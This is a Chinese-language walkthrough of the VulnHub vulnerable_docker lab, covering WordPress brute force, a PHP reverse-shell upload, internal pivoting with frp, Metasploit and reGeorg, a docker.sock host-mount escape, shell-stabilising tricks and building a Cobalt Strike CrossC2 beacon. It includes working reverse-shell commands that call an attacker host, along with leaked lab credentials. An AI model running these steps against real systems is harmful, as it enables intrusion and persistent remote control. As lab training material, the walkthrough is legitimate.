## vulnerable_docker_containement 简介

该项目是[NotSoSecure](https://www.vulnhub.com/author/notsosecure,563/)作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

下载链接：<https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova>

  

![1666707278_6357ef4e7aceb7b3b87e7.png!small?1666707278916](https://image.3001.net/images/20221025/1666707278_6357ef4e7aceb7b3b87e7.png!small?1666707278916)

该项目有始有终会用到信息收集->通过信息收集到的各种思路进行getshell->内网信息枚举->docker逃逸->提权，最终拿到flag.txt的过程，那么在这当中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透，并且文章附带了获取稳定shell以及linux上线CS的Tips

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

![1](https://image.3001.net/images/20221025/1666709103_6357f66f60438d798c7ac.png!small)

# 渗透过程

渗透测试的本质就是信息收集，信息收集决定了你的攻击面的宽窄！

## 1\. nmap全端口扫描

    
    
    nmap -p- 192.168.27.131 -A

![2](https://image.3001.net/images/20221025/1666709104_6357f67020f27de0d7b6b.png!small)

可以看到这是wordpress CMS

![3](https://image.3001.net/images/20221025/1666709104_6357f670c7c640dd65ba0.png!small)

发现存在admin登录点

![4](https://image.3001.net/images/20221025/1666709105_6357f6718ad814bf861ae.png!small)

## 2\. web信息收集

访问：[http://192.168.27.131:8000/](http://192.168.253.182:8000/)

使用wpscan进行扫描

wpscan --url [http://192.168.27.131:8000/](http://192.168.253.182:8000/)-eu

![5](https://image.3001.net/images/20221025/1666709106_6357f6725d27d72fcb026.png!small)

扫描到一个用户 bob

使用dirb对目录进行爆破

    
    
    dirb http://192.168.27.131:8000

发现

/wp-admin/admin-ajax.php

## 3\. 暴力破解

wpscan、burp、WPForce

WPForce是一套Wordpress Attack工具。目前，它包含2个脚本 -WPForce，它通过API暴力破解登录，以及Yertle，一旦找到管理员凭据就会上传shell。Yertle还包含许多开发后模块。

WPForce暴力破解：

<https://github.com/n00py/WPForce>

    
    
    git clone https://github.com/n00py/WPForce.git 

密码字典合集：

<https://github.com/danielmiessler/SecLists>

使用WPForce和上面的密码字典进行爆破

使用的是password中的一个字典，我把字典名字简化了一下，叫做10000.txt

注意，需要把用户名创建一个文本文档放进去 user.txt

    
    
    python wpforce.py -i user.txt -w 10000.txt -u http://192.168.27.131:8000/

![6](https://image.3001.net/images/20221025/1666709107_6357f67306798eeddf12b.png!small)

有进度显示

![7](https://image.3001.net/images/20221025/1666709107_6357f6739415e89b2985f.png!small)

爆破出一组用户名和密码

{'bob': 'Welcome1'}

成功登录后台

![8](https://image.3001.net/images/20221025/1666709108_6357f67421f80b5eb5cc6.png!small)

## 4\. 文件上传-getshell

### 上传php-reverse-shell.php

查找php-reverse-shell.php的位置

![9](https://image.3001.net/images/20221025/1666709108_6357f674b2253aa60901b.png!small)

![10](https://image.3001.net/images/20221025/1666709109_6357f67547ce2c95561df.png!small)

对反弹shell的端口和ip进行更改

![11](https://image.3001.net/images/20221025/1666709109_6357f675c9e19e64e102d.png!small)

更改完成后上传木马

![12](https://image.3001.net/images/20221025/1666709110_6357f676761b2e8c58a1e.png!small)

  

![13](https://image.3001.net/images/20221025/1666709111_6357f6778aaf43b4eeb0b.png!small)

选中木马并点击install Now

![14](https://image.3001.net/images/20221025/1666709112_6357f6781ac741aaf4367.png!small)

在如上图位置查看

点击，右面会出现URL，如下

![15](https://image.3001.net/images/20221025/1666709113_6357f679279b5c8e86442.png!small)

<http://192.168.27.131:8000/wp-content/uploads/2022/07/php-reverse-shell.php>

访问即可触发，拿到shell

![16](https://image.3001.net/images/20221025/1666709113_6357f679b5ab58349af0a.png!small)

发现没有python也没有wget

![17](https://image.3001.net/images/20221025/1666709114_6357f67a595e394c393d3.png!small)

### pty方法

安装了curl：

    
    
    python -m SimpleHTTPServer 8080 

开启一个http服务，从vps上下载socat

    
    
    curl -O http://192.168.27.195:8080/socat 

  

![18](https://image.3001.net/images/20221025/1666709114_6357f67ad7dfa8648ac9b.png!small)

    
    
    chmod +x socat

赋予权限

![19](https://image.3001.net/images/20221025/1666709115_6357f67b55506dd39ddf4.png!small)

    
    
    nc -vlp 9998

开启监听

    
    
    HOME=/dev/shm ./socat tcp:192.168.27.195:9998 exec:'/bin/bash -li',pty,stderr,sigint,sighup,sigquit,sane

![20](https://image.3001.net/images/20221025/1666709115_6357f67bd49462ab4bd4b.png!small)

![21](https://image.3001.net/images/20221025/1666709116_6357f67c602509d1535fc.png!small)

获取到稳定shell

使用script：

script -qc bash /dev/null

stty raw -echo

fg

## 5\. 内部文件信息收集

### linpeas脚本枚举

curl用法参考：

<https://www.cnblogs.com/hujiapeng/p/8470099.html>

利用之前开启的http服务，讲linpeas枚举脚本传至目标机器

    
    
    curl -# -O http://192.168.27.195:8080/linpeas.sh 

![22](https://image.3001.net/images/20221025/1666709116_6357f67ce2d207f74c9b6.png!small)

    
    
    chmod +x linpeas-.sh

![23](https://image.3001.net/images/20221025/1666709117_6357f67d806ae80fd343f.png!small)

授予权限并执行

1）Linux version 3.13.0-128-generic

![24](https://image.3001.net/images/20221025/1666709118_6357f67e05548d7f66294.png!small)

2）多个网卡信息：

![25](https://image.3001.net/images/20221025/1666709118_6357f67eb4e039e2f5935.png!small)

![26](https://image.3001.net/images/20221025/1666709119_6357f67f57403e0b2cd82.png!small)

  

3）mysql信息泄露：

![27](https://image.3001.net/images/20221025/1666709119_6357f67fd9dfca23dc962.png!small)

wordpress/WordPressISBest

手动进行查看，发现ifconfig命令无法执行，使用ip addr命令查看

![28](https://image.3001.net/images/20221025/1666709120_6357f680cf34cf923b366.png!small)

### 探测ip存活

探测有多少存活IP，对存活IP进行端口服务探测，逐个突破

172.18.0.0/16

使用脚本命令对存活IP进行探测

    
    
    for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;

![29](https://image.3001.net/images/20221025/1666709121_6357f681618f2604f137a.png!small)

下一步要进行端口探测

### 端口探测

端口探测脚本：

\------
#!/bin/bash

hosts=(

"172.18.0.1"

"172.18.0.2"

"172.18.0.3"

"172.18.0.4"

)

END=65535

for host in "${hosts[@]}"

do

echo "==============================="

echo "Scanning $host"

echo "==============================="

for ((port=1;port<=END;port++))

do

echo "" > /dev/tcp/$host/$port && echo "Port $port is open"

done 2>/dev/null

done

\------
![30](https://image.3001.net/images/20221025/1666709121_6357f681e1a5feb552f65.png!small)

同样通过http服务下载，赋予权限并运行

    
    
    curl -# -O http://192.168.27.195:8080/bash.sh   
    chmod +x bash.sh  
    ./bash.sh

![31](https://image.3001.net/images/20221025/1666709122_6357f6827e867ffb8ed91.png!small)

可以看到172.18.0.4开放了8022端口

    
    
    curl -s 172.18.0.4:8022

![32](https://image.3001.net/images/20221025/1666709123_6357f68325bcd43c2adf0.png!small)

### 方法一：进行代理访问

这里使用frp

对frpc.ini的内容进行修改

![33](https://image.3001.net/images/20221025/1666709123_6357f68398424a387d4e8.png!small)

# frpc.ini

[common]

server_addr = 192.168.27.195

server_port = 7000

[http_proxy]

type = tcp

remote_port = 7777

plugin = socks5

frps.ini

![34](https://image.3001.net/images/20221025/1666709124_6357f6842eab44a78fd59.png!small)

将frpc和frpc.ini上传至目标机

    
    
    curl -O http://192.168.27.195:8080/frpc   
    curl -# -O http://192.168.27.195:8080/frpc.ini 

![35](https://image.3001.net/images/20221025/1666709124_6357f684ac4fbbbbc0722.png!small)

赋予权限

    
    
    chmod +x frpc

先在kali上执行服务端

    
    
    ./frps -c frps.ini

![36](https://image.3001.net/images/20221025/1666709125_6357f6853481e3a464ba3.png!small)

在目标机上执行客户端

    
    
    ./frpc -c frpc.ini

![37](https://image.3001.net/images/20221025/1666709125_6357f685bb305974692d6.png!small)

服务端出现了success

![38](https://image.3001.net/images/20221025/1666709126_6357f68647dab51f82259.png!small)

代理完成

搭建成功后，修改代理配置文件

    
    
    gedit /etc/proxychains4.conf

![39](https://image.3001.net/images/20221025/1666709126_6357f686cb514e5598790.png!small)

加入

    
    
    socks5 192.168.253.138 7777

将其他注释掉

通过代理使用nmap扫描

    
    
    proxychains nmap -sT -sV -Pn -n -p8022 172.18.0.4

![40](https://image.3001.net/images/20221025/1666709127_6357f6877f5fda1a9869b.png!small)

这是Node.js的站，开放了8022端口

火狐浏览器：FoxyProxy 加入：socks5代理并选择访问

![41](https://image.3001.net/images/20221025/1666709128_6357f688497c9157a4eac.png!small)

  

访问[http://172.18.0.4](http://172.18.0.3:8022/)[:8022/](http://172.18.0.3:8022/)

![42](https://image.3001.net/images/20221025/1666709128_6357f688dacb79e9f54ed.png!small)

可以执行命令

纯docker环境

反弹shell到kali上面

    
    
    nc -vlp 9988  
    bash -i >& /dev/tcp/192.168.27.195/9988 0>&1

![43](https://image.3001.net/images/20221025/1666709129_6357f68973e74c79a66aa.png!small)

docker是一个容器引擎，可以拉取一些云端的镜像，每个镜像都是独立的轻量型的系统

查看ip

    
    
    ip a

![44](https://image.3001.net/images/20221025/1666709130_6357f68a2a0bee1c1321b.png!small)

在run目录下发现docker容器的拉取文件，存在remote API未授权访问

当前docker容器客户端，通过docker.sock文件可以直接访问到对应的容器内部

<https://www.secpulse.com/archives/55928.html>

![45](https://image.3001.net/images/20221025/1666709130_6357f68aa745b41aa2ea3.png!small)

![46](https://image.3001.net/images/20221025/1666709131_6357f68b8acc03e3613e0.png!small)

执行docker发现docker没有这个命令，可能是作者删除了

![47](https://image.3001.net/images/20221025/1666709132_6357f68c186895ca03961.png!small)

所以我们在当前环境下重新下载docker，然后查看docker中的情况

首先下载curl，然后使用curl下载docker

    
    
    apt-get update  
    apt-get install curl  
    curl -fsSL get.docker.com -o get-docker.sh  
    sh get-docker.sh  
    apt install docker

![48](https://image.3001.net/images/20221025/1666709132_6357f68c847fd2be53181.png!small)

这里有个坑，就是docker无法正常安装，我这里参考这篇文章：

<https://kalacloud.com/blog/how-to-install-and-use-docker-on-ubuntu/>

完全跟着文章来也不太行，我这里的思路是：

    
    
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"

这条命令是将引号中的内容加到源中，我使用这条命令在apt源中，添加阿里云和中科大的源，然后进行更新并安装docker

    
    
    apt update  
    apt install docker-ce

![49](https://image.3001.net/images/20221025/1666709133_6357f68d523f455d52247.png!small)

安装成功后查看容器内状态

    
    
    docker ps

![50](https://image.3001.net/images/20221025/1666709133_6357f68decd86d61200a9.png!small)

参考链接：<https://fosterelli.co/privilege-escalation-via-docker.html>

    
    
    docker run -it --rm -v /:/vol wordpress /bin/bash

`docker run -v /:/host -t -i bash`使用volume挂载主机上的所有文件到一个目录…成功提权…

### 方法二：使用MSF

#### getshell

首先开启一个监听

    
    
    use exploit/multi/handler

对ip和端口进行修改

![51](https://image.3001.net/images/20221025/1666709134_6357f68e79e75677ff6d6.png!small)

修改好后直接

`exploit -j`开启监听

![52](https://image.3001.net/images/20221025/1666709135_6357f68f4c1f7d6ae31b7.png!small)

MSF中的全部脚本都是ruby脚本

重新访问一下之前getshell时候上传的木马

![53](https://image.3001.net/images/20221025/1666709135_6357f68fcfb2f49e5ac87.png!small)

回连成功

`sessions -i`查看当前会话

![54](https://image.3001.net/images/20221025/1666709136_6357f6904bc6fdee852e2.png!small)

`sessions 1`拿到id为1的shell

![55](https://image.3001.net/images/20221025/1666709136_6357f690b75cf0dfc523e.png!small)

如果输入exit的话，shell会断掉，在sessions中也断掉了

重新拿到shell，id为2

#### 获取稳定shell

使用msf中的另外的脚本来获取稳定shell

    
    
    use post/multi/manage/shell_to_meterpreter  
    set session 2  
    run

![56](https://image.3001.net/images/20221025/1666709137_6357f6912f19ac2c65021.png!small)

这个时候就可以获取到一个稳定的shell

![57](https://image.3001.net/images/20221025/1666709137_6357f691c904fda6757d9.png!small)

![58](https://image.3001.net/images/20221025/1666709138_6357f6927311828f34079.png!small)

![59](https://image.3001.net/images/20221025/1666709139_6357f6931668fd3ad0e0f.png!small)

很多命令都可以执行了

查看到有172.18.0.3的ip

#### 添加路由表

参考：
[https://pingmaoer.github.io/2020/05/09/利用msf自带的route模块穿透目标内网/](%E5%8F%82%E8%80%83%EF%BC%9A%20https%3A//pingmaoer.github.io/2020/05/09/%E5%88%A9%E7%94%A8msf%E8%87%AA%E5%B8%A6%E7%9A%84route%E6%A8%A1%E5%9D%97%E7%A9%BF%E9%80%8F%E7%9B%AE%E6%A0%87%E5%86%85%E7%BD%91/)

方法一：

首先可以使用route或者ipconfig查看目标主机的相关信息

![60](https://image.3001.net/images/20221025/1666709139_6357f693c875b0fdbd1d8.png!small)

  

`run autoroute -s 172.18.0.0/24`添加路由表

`run autoroute -p`查看路由表情况

![61](https://image.3001.net/images/20221025/1666709140_6357f6945221ed7d5658d.png!small)

方法二：

use post/multi/manage/autoroute

set SUBNET 172.18.0.0

set session 2

exploit

background 退出shell，但是不断开

![62](https://image.3001.net/images/20221025/1666709140_6357f694d114f9d66fff6.png!small)

#### IP存活扫描端口扫描

172.18.0段做端口扫描：

    
    
    use auxiliary/scanner/portscan/tcp

`set RHOSTS 172.18.0.0/24`172.18.0.1,172.18.0.2,172.18.0.3

    
    
    set session 2  
    exploit

![63](https://image.3001.net/images/20221025/1666709141_6357f6954dd364959e575.png!small)

开启socks4a proxy代理：

    
    
    use auxiliary/server/socks_proxy  
    set SRVPORT 1090  
    set session 2

![64](https://image.3001.net/images/20221025/1666709141_6357f695e27c2eb984210.png!small)

![65](https://image.3001.net/images/20221025/1666709142_6357f696acef32365b529.png!small)

使用netstat -ntulp查看

![66](https://image.3001.net/images/20221025/1666709143_6357f6972f73a254b6d7b.png!small)

可以看到1090已经开启

 **或者**`use post/multi/manage/shell_to_meterpreter`\---不需要设置，默认1080端口

  

代理软件步骤和之前frp的一样，不过协议为socks4

    
    
    gedit /etc/proxychains4.conf  
    socks4 127.0.0.1 1090

测试：

    
    
    proxychains ssh 172.18.0.4

![67](https://image.3001.net/images/20221025/1666709143_6357f697a32a7388fcf6e.png!small)

代理成功

### 方法三：reGeorg代理之路

    
    
    curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php   
    curl -# -O http://192.168.27.195:8080/tunnel.php   
    ##复制到当前目录下  cp /tmp/tunnel.php .

访问：[http://192.168.27.131:8000/tunnel.php](http://192.168.253.182:8000/tunnel.php)

回显：Georg says, 'All seems fine' ---正常

![68](https://image.3001.net/images/20221025/1666709144_6357f698299225638a1fb.png!small)

    
    
    python reGeorgSocksProxy.py -u http://192.168.27.131:8000/tunnel.php 

执行完就会开启一个socks5的代理，默认开启127.0.0.1：8888

利用之前枚举出的信息中的数据库账号密码进行代理验证

    
    
    proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4 

![69](https://image.3001.net/images/20221025/1666709144_6357f698c6a3806cf870e.png!small)

验证成功

这个容器docker.sock允许与 docker 通信，意味着创建、添加、删除容器，因此有一个技巧可以通过上传docker和运行命令docker run
-it -v /:/host/ <container_name> chroot /host/ bash二进制文件将主机系统挂载到 docker
容器上，而不是我们有 docker 端口，我们可以访问这些容器，这样我们就可以远程做这个

如果开启了2375端口：

docker -H tcp://192.168.253.182:2375 run --rm -it -v /:/host wordpress chroot
/host bash

至此攻击结束

## ### 获取完美shell

正常使用webshell或反弹shell的时候，多少会遇到一些问题

  1. 一些命令受限

  2. 非交互式

  3. ctrl+c会直接断开连接

  4. 无命令补全

  5. 会出现乱码情况

可以使用一个完美的终端（TTY）

## python pty方式

这个方式的前提是对方机器上有python，通过rpm方式可以查询对方主机是否存在python

#pty是python中的一个虚拟终端库

#spawn函数：创建一个进程并将其控制终端与当前进程的标准io连接

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'

通常情况下如果原本不能执行su的话，现在就可以执行了，不过这种方式还是没啥提升，所以我们继续

## socat

socat像netcat一样，我们可以用socat建立完整的TTY，但弊端就是需要在对方的主机上建立socat，说人话就是你得在对方机器安装或下载点东西，当然攻击机也需要安装

kali

#安装（因为我用的kali，所以就不用安了，它自带的）

sudo apt install socat

#监听端口

    
    
    socat file:`tty`,raw,echo=0 tcp-listen:4444

目标机

#从github上下载脚本（省的安装了）到/tmp目录下

#当然可能碰到无法访问github的情况，那就本机下载然后传上去

wget <https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat>-O /tmp/socat

#给权限

    
    
    chmod 755 /tmp/socat

#反弹

    
    
    /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.113:4444

此时的话vim都可以执行了，ctrl+c也不会断开了，但是偶尔会出现卡死的现象

这里断开连接的话要用exit

## 升级netcat

攻击机

# 检查当前终端和STTY信息

echo $TERM

stty -a

![70](https://image.3001.net/images/20221025/1666709145_6357f6996931f8816c26b.png!small)

接受shell

#在接收到shell并启动下方的python交互式命令后

python -c 'import pty; pty.spawn("/bin/bash")'

#挂到后台

ctrl + z

#查看下后台是否存在

jobs -l

成功挂到后台

![71](https://image.3001.net/images/20221025/1666709146_6357f69a25fffb34be2ad.png!small)

然后重置stty

    
    
    stty raw -echo 1

重置后长这样

![72](https://image.3001.net/images/20221025/1666709146_6357f69a94c09360bd871.png!small)

然后输入fg，将后台的任务还原，然后reset刷新终端屏幕，如图我这里出了点问题，当我输入回车的时候变成了^M又是一些奇怪的编码问题

#将后台挂起的任务还原到前台

fg

执行出错

于是我弹shell到阿里云上，然后重复上面的步骤，当我执行到重置stty的时候，它会像卡了一样，但其实不是它卡了，而是我们重置的原因我们看不到输入的内容，但是实际上还是在输入（这就像你输入密码的时候一样），输入fg回车

![73](https://image.3001.net/images/20221025/1666709146_6357f69af39891a35210f.png!small)

紧接着执行刷新一下屏幕，看着更和谐

reset

![74](https://image.3001.net/images/20221025/1666709147_6357f69b7b930e522b728.png!small)

回车之后

![75](https://image.3001.net/images/20221025/1666709147_6357f69bea33ea3e3c5ca.png!small)

然后其实到这里几乎就可以了，但是还存在一个问题，就是显示问题了

接下来设置环境变量

export SHELL=bash

#根据最开始查出来的环境变量来设置

export TERM=xterm

stty rows 行数 columns 列数

成功获取到完美shell

stty raw -echo 解析

1、stty：stty是一个用来改变并打印终端行设置的常用命令。

2、RAW模式与非RAW模式：

1）RAW模式简单的来说，就是发送端发动的二进制码原封不动的被接收端接收。

2）非RAW模式下，系统会对串口收到的数据中某些具有特殊意义的字符或组合进行转义。

3、stty -echo 设置命令不被显示 -echo（不回显）

stty raw -echo意思是：就是用RAW模式来原封不动传输回显数据，在设置时不要回显多余的信息。

也就是常说的稳定shell！

raw好处：该raw设置意味着输入和输出不被处理，只是直通发送数据，处理可以是忽略某些字符，将字符转换为其他字符，允许中断信号等等，因此stty
raw无法按Ctrl-C结束进程！

那为什么要执行完输入fg？

1、fg(前台执行) frontground

2、bg(后台执行) background

inux提供的fg和bg命令，可以让我们轻松调度正在运行的任务。

假设：你发现运行的一个程序需要很长的时间，但是需要干别的事情，你就可以用ctrl-z挂起这个程序，然后可以看到系统的提示:

[1]+ Stopped /root/bin/rsync.sh

这里的序列号为ID：1，然后我们可以把程序调度到后台执行：（bg 作业号）

bg 1 ---就可以运行调度该后台执行

而fg命令不加参数时，使用效果就是让刚才最近被你挂起的进程返回前台执行！！

  

延伸拓展：

1、fg、bg、jobs、&、 ctrl+z都是跟系统任务有关的，学会了相当的实用！

2、设置串口为RAW模式

在Linux下系统的tty模式为非RAW模式，如果要调试单片机这种嵌入式设备，则需要将串口设置为RAW模式。

对tty的操作使用 stty 命令。

设置串口波特率到9600：

stty -F /dev/ttyX 9600

设置串口为RAW模式：

stty -F /dev/ttyX 115200

也可以在同一条命令中同时这是波特率和RAW模式：

stty -F /dev/ttyX 115200 raw

注意：我在Mac电脑上使用stty时，发现其命令行参数 -F 需要用 -f 来替换。

  

Linux命令-stty命令

<https://www.cnblogs.com/tianzhiyi/p/5312056.html>

<https://www.cnblogs.com/xdzone/archive/2011/03/15/1984981.html>

Linux下RAW模式串口设置

<http://www.51testing.com/html/03/n-3714603.html>

bg和fg指令（整理）以及 Linux中Ctrl+C、Ctrl+D等按键操作&进程相关命令

<https://blog.csdn.net/deniece1/article/details/102770363>

## Linux主机上线CS

这个插件对CS版本有要求，建议使用对应版本，不然很难上线成功

使用CrossC2插件即可上线linux主机

<https://github.com/gloxec/CrossC2/releases>

![76](https://image.3001.net/images/20221025/1666709148_6357f69c720a27703e269.png!small)

把下载下来的文件放在一个文件夹内，然后开始配置CrossC2.cna文件。

这个文件只需要修改下$CC2_PATH和$CC2_PATH两个位置就行

$CC2_PATH是插件的绝对路径，路径的”/”需要双写

$CC2_BIN 是配置客户端类型，一定不能选错，选错了CS无法成功安装CrossC2插件

![77](https://image.3001.net/images/20221025/1666709148_6357f69ceea6e19661067.png!small)

![78](https://image.3001.net/images/20221025/1666709149_6357f69da1c4572946b33.png!small)

接下来开始CS，然后把服务端 .cobaltstrike.beacon_keys的key文件下载下来，也放到插件的文件中

然后在CS中导入这个插件

![79](https://image.3001.net/images/20221025/1666709150_6357f69e3e49e2ed5f753.png!small)

功能栏会出现CrossC2，然后需要创建一个https的监听器

![80](https://image.3001.net/images/20221025/1666709150_6357f69eb5475a645a893.png!small)

![81](https://image.3001.net/images/20221025/1666709151_6357f69f3b04f489af7ba.png!small)

然后配置好监听端口、监听器、beacon_keys文件路径、目标主机系统类型、马子的输出路径

![82](https://image.3001.net/images/20221025/1666709151_6357f69fc49e1a3545e06.png!small)

build生成木马

![83](https://image.3001.net/images/20221025/1666709152_6357f6a05c35b77b04099.png!small)

![84](https://image.3001.net/images/20221025/1666709152_6357f6a0e3541a57817f0.png!small)

上传到靶机并且赋予执行权限，执行即可上线，如果无法成功，建议重新下载key，覆盖之前的，再重新尝试

## 总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到docker逃逸项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、wordpress漏洞利用、docker逃逸、提权、获取稳定shell、linux上线CS等等，希望伙伴们能实际操作复现一遍，不要眼高手低！巩固自身的渗透技术和技巧！

最后

希望大家提高安全意识，没有网络安全就没有国家安全！

